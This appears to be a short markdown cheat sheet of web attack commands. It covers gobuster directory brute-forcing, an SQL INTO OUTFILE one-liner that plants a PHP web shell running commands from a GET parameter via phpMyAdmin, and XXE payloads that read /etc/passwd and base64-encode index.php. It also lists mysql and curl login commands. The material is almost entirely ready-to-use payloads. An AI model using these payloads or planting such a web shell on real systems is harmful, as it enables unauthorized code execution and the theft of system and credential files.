# Web

- [BruteForce Url](#bruteforce-url)
- [PhpMyAdmin](#phpmyadmin)
- [XML external entity (XXE)](#xml-external-entity-xxe)
- [Mysql](#mysql)

## BruteForce Url
### Gobuster
```
gobuster dir -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 25 -x html,php
```
### Dibuster
```
dirbuster
```

### Zap
```
owasp-zap
```

## PhpMyAdmin
### Quick Shellcode
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
```

## XML external entity (XXE)
### Read File
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<foo>Hello &file;</foo>
```
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
]>
<foo>Hello &file;</foo>
```
### Get Link
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "http://example.com/path">
]>
<foo>Hello &file;</foo>
```
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<foo>Hello &file;</foo>
```

## MySql
### Connect to mysql
```
mysql -h localhost -u myname -p
```

## Request
### Curl
```
curl 'http://example.com/login' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=login&password=pass'
```
